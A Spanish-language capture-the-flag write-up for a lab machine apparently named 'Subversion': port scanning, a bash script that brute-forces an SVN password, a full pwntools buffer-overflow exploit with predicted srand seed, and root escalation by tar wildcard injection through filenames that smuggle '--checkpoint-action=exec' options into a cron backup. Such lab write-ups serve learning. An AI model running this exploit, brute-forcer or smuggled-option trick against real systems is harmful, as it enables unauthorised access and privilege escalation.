## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 22:12 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Subversi\xC3\xB3n
|_http-server-header: nginx/1.18.0 (Ubuntu)
1789/tcp open  hello?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck: 
|     Bienvenido a subversion!
|     Pregunta 1: 
|     ocurri
|     Revoluci
|     Francesa?
|     Respuesta:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, SSLSessionReq: 
|     Bienvenido a subversion!
|     Pregunta 1: 
|     ocurri
|     Revoluci
|     Francesa?
|_    Respuesta: Respuesta incorrecta. No puedes continuar.
3690/tcp open  svnserve Subversion
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1789-TCP:V=7.95%I=7%D=1/12%Time=678468A1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,61,"Bienvenido\x20a\x20subversion!\nPregunta\x201:\x20\xc2\xbfEn\x20
SF:qu\xc3\xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x
SF:20Francesa\?\nRespuesta:\x20")%r(GenericLines,8C,"Bienvenido\x20a\x20su
SF:bversion!\nPregunta\x201:\x20\xc2\xbfEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20
SF:ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x20Francesa\?\nRespuesta:\x20
SF:Respuesta\x20incorrecta\.\x20No\x20puedes\x20continuar\.\n")%r(GetReque
SF:st,8C,"Bienvenido\x20a\x20subversion!\nPregunta\x201:\x20\xc2\xbfEn\x20
SF:qu\xc3\xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x
SF:20Francesa\?\nRespuesta:\x20Respuesta\x20incorrecta\.\x20No\x20puedes\x
SF:20continuar\.\n")%r(HTTPOptions,8C,"Bienvenido\x20a\x20subversion!\nPre
SF:gunta\x201:\x20\xc2\xbfEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3
SF:\x20la\x20Revoluci\xc3\xb3n\x20Francesa\?\nRespuesta:\x20Respuesta\x20i
SF:ncorrecta\.\x20No\x20puedes\x20continuar\.\n")%r(RTSPRequest,8C,"Bienve
SF:nido\x20a\x20subversion!\nPregunta\x201:\x20\xc2\xbfEn\x20qu\xc3\xa9\x2
SF:0a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x20Francesa\?\
SF:nRespuesta:\x20Respuesta\x20incorrecta\.\x20No\x20puedes\x20continuar\.
SF:\n")%r(RPCCheck,61,"Bienvenido\x20a\x20subversion!\nPregunta\x201:\x20\
SF:xc2\xbfEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revolu
SF:ci\xc3\xb3n\x20Francesa\?\nRespuesta:\x20")%r(DNSVersionBindReqTCP,61,"
SF:Bienvenido\x20a\x20subversion!\nPregunta\x201:\x20\xc2\xbfEn\x20qu\xc3\
SF:xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x20Franc
SF:esa\?\nRespuesta:\x20")%r(DNSStatusRequestTCP,61,"Bienvenido\x20a\x20su
SF:bversion!\nPregunta\x201:\x20\xc2\xbfEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20
SF:ocurri\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x20Francesa\?\nRespuesta:\x20
SF:")%r(Help,8C,"Bienvenido\x20a\x20subversion!\nPregunta\x201:\x20\xc2\xb
SF:fEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20ocurri\xc3\xb3\x20la\x20Revoluci\xc3
SF:\xb3n\x20Francesa\?\nRespuesta:\x20Respuesta\x20incorrecta\.\x20No\x20p
SF:uedes\x20continuar\.\n")%r(SSLSessionReq,8C,"Bienvenido\x20a\x20subvers
SF:ion!\nPregunta\x201:\x20\xc2\xbfEn\x20qu\xc3\xa9\x20a\xc3\xb1o\x20ocurr
SF:i\xc3\xb3\x20la\x20Revoluci\xc3\xb3n\x20Francesa\?\nRespuesta:\x20Respu
SF:esta\x20incorrecta\.\x20No\x20puedes\x20continuar\.\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.95 seconds
```

el reporte de `nmap` informa de 3 servicios expuestos

```bash
80/tcp          Servicio Web
1789/tcp        Servicio Desconocido
3690/tcp        Servicio svnserve
```

chequeo el puerto `1789` rapidamente conectandome con netcat

![image](https://github.com/user-attachments/assets/ab3707f6-3ede-4c19-8518-a12e1f0b6d97)

ummm no se de que vaya esto asi que mejor continuo chequeando el servicio web

![image](https://github.com/user-attachments/assets/774f72da-ef54-4cfb-b2b9-e23f104171a5)

no observo nada, asi que le hago fuzzing 

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 10 -C 404
```

![image](https://github.com/user-attachments/assets/fefbfbef-a102-432d-9383-ae245f21c65c)

aqui observo `http://172.17.0.2/upload` asi que accedo y termina descangando el archivo `upload`

![image](https://github.com/user-attachments/assets/d8f83214-5704-4718-9497-8ec8c32a8e3c)

aqui puedo observar el user `svnuser` y el repositorio `subversion`, esto me servira para el servicio que corre en el puerto 3690

```ruby
svn list svn://172.17.0.2/subversion --username 'svnuser'
```

![image](https://github.com/user-attachments/assets/1ba96bf0-6dd9-43aa-8575-f7227ddacb9f)

es necesario la password para poder acceder pero no la tengo por lo que le aplicare un ataque de diccionario

![image](https://github.com/user-attachments/assets/90b286d8-4e48-441b-912b-f379015c856b)

no logro nada con `hydra` asi que intentare crear un script que automatice el proceso de ir probando una wordlist

```bash
#!/bin/bash

# Colores
CRE='\033[31m'  # Rojo
CYE='\033[33m'  # Amarillo
BLD='\033[1m'   # Negrita
CNC='\033[0m'   # Resetear colores

printf "${BLD}${CRE}                                          \n"
printf "  ____ _    _    _    ___ ____ ____ ____ ____                    \n"
printf "  [__   \  /  |\ | __ |__ |  | |__/ |    |___                \n"
printf "  ___]   \/   | \|    |   |__| |  \ |___ |___          \n"
printf "                               \n"
printf "${BLD}${CYE}                                          \n"

if [ $# -ne 3 ]; then
    echo "Uso: $0 <parametro1 [REPO]> <parametro2 [user]> <parametro3 [wordlist]>"
    exit 1
fi


# Variables
REPO_URL=$1
USER=$2
PASS_LIST=$3


#REPO_URL="svn://172.17.0.2/subversion"   Cambia esto a tu URL de repositorio
#USER="svnuser"                                  Usuario fijo
#PASS_LIST="/usr/share/wordlists/rockyou.txt"  Archivo con lista de contraseñas

# Comprobar si el archivo de contraseñas existe
if [[ ! -f $PASS_LIST ]]; then
    echo "El archivo de contraseñas no existe: $PASS_LIST"
    exit 1
fi


sleep 1

# Intentar acceder al repositorio con el usuario "svnuser" y cada contraseña
while read -r pass; do
    echo "Probando usuario: $USER con contraseña: $pass"

    # Probar la conexión SVN
    svn list "$REPO_URL" --username "$USER" --password "$pass" 2>/dev/null

    if [[ $? == 0 ]]; then
        clear
        echo "¡Acceso exitoso! Usuario: $USER, Contraseña: $pass"
        exit 0
    fi


done < "$PASS_LIST"

echo "No se encontró ninguna combinación válida para el usuario $USER."
```

lo guado como `svn-force.sh` y le doy permisos de ejecucion `chmod +x svn-force.sh`

https://github.com/user-attachments/assets/86434c34-15f9-4415-b6d2-6c036fd4c0d2

ya con las credenciales, me descargo el repositorio

```ruby
svn checkout svn://172.17.0.2/subversion --username 'svnuser' --password 'iloveyou!'
```

obtengo un nuevo directorio con el nombre del repositorio `subversion` obteniendo los archivos `subversion & subversion.c`, comienzo chequeando el codigo fuente 

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

void ask_questions();
void magic_text();
void normalize_input(char *str);

int main() {
    // Desactiva el buffering en stdout
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Bienvenido a subversion!\n");
    ask_questions();
    return 0;
}

void ask_questions() {
    char answer[256];
    int random_number;
    char number_str[5];

    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;

    // Pregunta 1
    printf("Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "1789") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 2
    printf("Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "satyagraha") != 0 && strcmp(answer, "noviolencia") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 3
    printf("Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "caidadelmurodeberlin") != 0 && strcmp(answer, "caidadelmuro") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 4
    printf("Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "cartamagna") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 5
    printf("Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "luchacontraelapartheid") != 0 && strcmp(answer, "movimientoantiapartheid") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta aleatoria
    printf("Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);

    // Convertir la respuesta del usuario a entero
    int user_guess = atoi(answer);

    if (user_guess != random_number) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    printf("¡Felicitaciones! Has adivinado el número secreto.\n");
    magic_text();
}

void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}


void normalize_input(char *str) {
    char *src = str;
    char *dst = str;
    while (*src) {
        if (*src == '\n' || *src == '\r') {
            src++;
            continue;
        }
        if (isspace((unsigned char)*src)) {
            src++;
            continue;
        }
        // Convertir a minúsculas y eliminar acentos
        unsigned char c = (unsigned char)*src;
        if (c >= 'A' && c <= 'Z') {
            c = c + ('a' - 'A');
        }
        // Eliminar caracteres especiales (acentos)
        if (c == 0xE1 || c == 0xC1) c = 'a';
        else if (c == 0xE9 || c == 0xC9) c = 'e';
        else if (c == 0xED || c == 0xCD) c = 'i';
        else if (c == 0xF3 || c == 0xD3) c = 'o';
        else if (c == 0xFA || c == 0xDA) c = 'u';
        else if (c == 0xF1 || c == 0xD1) c = 'n';

        *dst++ = c;
        src++;
    }
    *dst = '\0';
}

void shell() {
    system("/bin/bash");
}
```

el funcionamiento consiste en imprime un mensaje de bienvenida y luego ejecuta la funcion `ask_questions` que se encarga de realizar 5 preguntas y una 6ta preguntando por
el numero secreto, pero si continuo analizando el programa, el numero secreto se genera con este fragmento de codigo

```c
    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;
```
si ingresamos el numero secreto correcto, entonces salta a la funcion `magic_text` 

```c
void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}
```
esta funcion almacena en un buffer de 64 byte la entrada del usuario lo cual termina siendo vulnerable a un buffer overflow por el uso de `gets` que 
no valida el tamano de la entrada por parte del usuario, la funcion es practicamente inutil ya que solo imprime lo que el usuario a pasado anteriormente,
lo importante aqui es que debido a que es vulnerable a un bof podemos cambiar el flujo del programa hasta la funcion `shell` que nunca se invoca en el programa
y asi conseguir ejecutar el comando `/bin/bash`

funcion `shell`

```c
void shell() {
    system("/bin/bash");
}
```
para lograr explotar este binario es necesario crear un exploit

## Explotando el binario `subversion`

comienzo ejecutando el binario para observar mejor su comportamiento

![image](https://github.com/user-attachments/assets/182285cf-b5c4-4a96-b163-8dfd31937a49)

ahora comienzo a crear el exploit

```nano exploit.py```

```python
from pwn import *


def explotation():

    binary = "./subversion"
    l = process(binary)

    # Interactuamos con el programa enviando las respuestas esperadas


    l.recvuntil(b"Respuesta:")
    l.sendline(b"1789")  # enviamos la primera respuesta


    l.recvuntil(b"Respuesta:")
    l.sendline(b"satyagraha")   # enviamos la segunda respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"caidadelmuro") # se envia la tercera respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"cartamagna")   # 4ta respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"movimientoantiapartheid") # 5ta respuesta

    l.interactive() # testeamos


if __name__ == '__main__':
    explotation()
```

![image](https://github.com/user-attachments/assets/0b2abc05-eedb-4e50-b88c-7f14fb9a3489)

va funcionando, ahora se debe generar el mismo numero aleatorio que se genera en el binario, recordemos el codigo que se encarga de generar este numero

```c
    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;
```

este mismo codigo lo incorporo en python importando `ctypes` & `time` y anadiendo una funcion mas que se encargue de generar el numero aleatorio

```python
def randomfun():
    # Función rand() de C
    libc = ctypes.CDLL('libc.so.6')
    rand = libc.rand
    srand = libc.srand
    
    # Obtener la semilla basada en el tiempo
    current_time = int(time.time()) ^ 69
    srand(current_time)
    
    # Generar el número aleatorio
    random_number = rand() % 10000000
    return random_number
```
ahora lo que retorna esta funcion se lo debemos enviar al binario como entrada cuando solicite el numero aleatorio, quedando el codigo asi

```python
from pwn import *
import ctypes
import time

def randonfun():

    libc = ctypes.CDLL('libc.so.6')
    rand = libc.rand
    srand = libc.srand
    current_time = int(time.time()) ^ 69
    srand(current_time)
    random_number = rand() % 10000000
    return random_number



def explotation():

    binary = "./subversion"
    l = process(binary)

    # Interactuamos con el programa enviando las respuestas esperadas


    l.recvuntil(b"Respuesta:")
    l.sendline(b"1789")  # enviamos la primera respuesta


    l.recvuntil(b"Respuesta:")
    l.sendline(b"satyagraha")   # enviamos la segunda respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"caidadelmuro") # se envia la tercera respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"cartamagna")   # 4ta respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"movimientoantiapartheid") # 5ta respuesta


    val = randonfun() # almacenamos en una variable lo que devuelve la funcion que genera el numero aleatorio
    l.recvuntil(b"Respuesta:")
    l.sendline(str(val).encode()) # 6ta respuesta (numero aleatorio) aqui convertimos a string el valor almacenado en la variable val y luego a binario para poder enviarlo correctamente al proceso

    l.interactive() # testeamos


if __name__ == '__main__':
    explotation()
```

ejecutamos el exploit para ver como va respondido

![image](https://github.com/user-attachments/assets/0d6ed0ac-19fe-481e-9c04-359b5e5eabed)

hemos logrado pasar el numero "aleatorio", ahora hemos llegado al punto que es vulnerable a un buffer overflow y donde conocemos que el tamano del buffer es de 64 byte
sin embargo, es necesario llegar a manipular el `RIP` para poder hacer el salto a la funcion `shell` y ejecutar `/bin/bash`, pero si relleno el buffer con 64 byte no podre
manipular el `RIP` debido a que faltan los 8 byte de `RBP` (Puntero de Marco); y luego del `RBD` es que puedo alcanzar el `RIP`, por lo que queda asi

```bash

BUFFER 64 byte + RBD 8 byte = alcanzo RIP

```
ahora solo me falta la direccion de memorio de la funcion a la cual voy a saltar que en este caso sera `shell` asi que ejecuto el binario con `gdb` para localizar 
dicha direccion

```bash
gdb ./subversion -q # corro el binario dentro del depurador
```

![image](https://github.com/user-attachments/assets/c0b1a129-4eec-4d08-8eac-2bb8808a6638)

aqui debo hacer uso de la direccion `0x00000000004017b4`, ya que directamente asigna el argumento requerido ("/bin/bash") y realiza la 
llamada a system(), asegurando que la cadena "/bin/bash" se ejecute correctamente. Ya teniendo toda esta informacion solo queda construir el `payload` que
se le enviara al binario para obtener la `shell` asi que el codigo quedaria asi:

```python
from pwn import *
import ctypes
import time

def randonfun():

    libc = ctypes.CDLL('libc.so.6')
    rand = libc.rand
    srand = libc.srand
    current_time = int(time.time()) ^ 69
    srand(current_time)
    random_number = rand() % 10000000
    return random_number



def explotation():

    binary = "./subversion"
    l = process(binary)

    # Interactuamos con el programa enviando las respuestas esperadas


    l.recvuntil(b"Respuesta:")
    l.sendline(b"1789")  # enviamos la primera respuesta


    l.recvuntil(b"Respuesta:")
    l.sendline(b"satyagraha")   # enviamos la segunda respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"caidadelmuro") # se envia la tercera respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"cartamagna")   # 4ta respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"movimientoantiapartheid") # 5ta respuesta


    val = randonfun() # almacenamos en una variable lo que devuelve la funcion que genera el numero aleatorio
    l.recvuntil(b"Respuesta:")
    l.sendline(str(val).encode()) # 6ta respuesta (numero aleatorio) aqui convertimos a string el valor almacenado en la variable val y luego a binario para poder enviarlo correctamente al proceso


    # aqui comienzo a preparar el payload para saltar a la direccion 0x00000000004017b4

    memory = p64(0x00000000004017b4)

    payload = b"A"*64  #sobreescribo el buffer
    payload += b"B"*8  #sobreescribo el RBD
    payload += memory  # sobreescribo el RIP con la direccion de memoria a la cual quiero saltar

    l.recvuntil(b"continuar:") # aqui nos solicita el magico texto para continuar:
    l.sendline(payload) # envio el payload al proceso

    l.interactive() # testeamos

if __name__ == '__main__':
    explotation()
```

ejecuto el exploit y consigo la `shell`

![image](https://github.com/user-attachments/assets/60b61e37-a0da-4d9f-a28f-930db6512e78)

si recordamos en un principio el puerto 1789, cuando me conecte a el con netcat me hacia las mismas preguntas que hace el binario `subversion` por lo que lo mas
seguro es que en ese puerto este corriendo dicho binario, asi que para lograr el acceso modificare nuevamente el exploit para apuntar de forma remota al puerto `1789`
quedando el exploit asi :

```python
from pwn import *
import ctypes
import time

def randonfun():

    libc = ctypes.CDLL('libc.so.6')
    rand = libc.rand
    srand = libc.srand
    current_time = int(time.time()) ^ 69
    srand(current_time)
    random_number = rand() % 10000000
    return random_number



def explotation():

    host = "172.17.0.2"
    port = 1789
    l = remote(host, port)

    # Interactuamos con el programa corriendo en el puerto 1789 del host 172.17.0.2

    l.recvuntil(b"Respuesta:")
    l.sendline(b"1789")  # enviamos la primera respuesta


    l.recvuntil(b"Respuesta:")
    l.sendline(b"satyagraha")   # enviamos la segunda respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"caidadelmuro") # se envia la tercera respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"cartamagna")   # 4ta respuesta

    l.recvuntil(b"Respuesta:")
    l.sendline(b"movimientoantiapartheid") # 5ta respuesta


    val = randonfun() # almacenamos en una variable lo que devuelve la funcion que genera el numero aleatorio
    l.recvuntil(b"Respuesta:")
    l.sendline(str(val).encode()) # 6ta respuesta (numero aleatorio) aqui convertimos a string el valor almacenado en la variable val y luego a binario para poder enviarlo correctamente al proceso


    # aqui comienzo a preparar el payload para saltar a la direccion 0x00000000004017b4

    memory = p64(0x00000000004017b4)

    payload = b"A"*64  #sobreescribo el buffer
    payload += b"B"*8  #sobreescribo el RBD
    payload += memory  #sobreescribo el RIP con la direccion de memoria a la cual quiero saltar

    l.recvuntil(b"continuar:") # aqui nos solicita el "magico" texto para continuar:
    l.sendline(payload) # envio el payload al proceso

    l.interactive() # testeamos

if __name__ == '__main__':
    explotation()
```
procedo a ejecutarlo y obtengo el acceso

![image](https://github.com/user-attachments/assets/5ac7fd3e-0cc6-436e-bf2c-c273b1ac5626)

## Escalada de privilegios

### luigi

solo existe un usuario en el sistema y si reviso los procesos puedo ver que corre `cron` lo que quiere decir que alguna tarea esta programada para ser ejecutada 
por lo que reviso el archivo de configuracion de tareas cron

```ruby
cat /etc/crontab
```


![image](https://github.com/user-attachments/assets/c57b34c6-bc60-4811-87fe-246ef22f75ff)

se observa `* * * * * root /usr/local/bin/backup.sh`, es decir, cada minuto se ejecuta un script, asi que chequeare dicho script y sus permisos

![image](https://github.com/user-attachments/assets/9131690e-3138-4adc-9581-e24f3999f7c3)

por un lado no podria modificar el script, por otro lado el script lo que hace es crear un directorio en la raiz llamado `backups` luego va al directorio del 
usuario `luigi` y por ultimo comprime en un archivo `.tar.gz` todo el contenido del directorio de `luigi`, parece seguro el script pero no lo es, a travez de `tar` 
es posible la ejecucion de comandos, si chequeamos GTFOBINS vemos lo siguiente

![image](https://github.com/user-attachments/assets/320d44c4-a5de-4be8-97b8-8b00ea424882)

directamente no podria ejecutar ese codigo pero puedo falsificar los parametros del comando `tar`, ya que en el script hace uso de `*` para seleccionar todos los archivos
del directorio, asi que lo que hare sera crear 2 archivos, estos archivos tendran los nombres de los parametros `--checkpoint=1` & `--checkpoint-action=exec=sh scape.sh`
ademas creare el script `scape.sh`

![image](https://github.com/user-attachments/assets/e8143db9-8c14-4114-8ff5-661e58d47de0)

 la idea es que cuando estos 3 archivos vayan a ser comprimidos, no los tome como archivos, sino como parametros para `tar`, algo asi se veria

 ```bash
tar -czf /backups/home_luigi_backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh scape.sh scape.sh
```

en este caso los archivos `--checkpoint=1 & --checkpoint-action=exec=sh` son interpretados como parametros y no como archivos por lo que no son comprimidos y logrando
asi ejecutar el script `scape.sh` que le asigna el bit suid a `/bin/bash`

![image](https://github.com/user-attachments/assets/7940d0d4-c083-4d4c-b64d-d7012511f78a)

pasado un minuto reviso los permisos y observo que fue asignado el bit suid correctamente asi que puedo escalar a `root`

![image](https://github.com/user-attachments/assets/d80939c6-e613-47a2-8890-634c05f916f1)

## PWNED-ROOT

















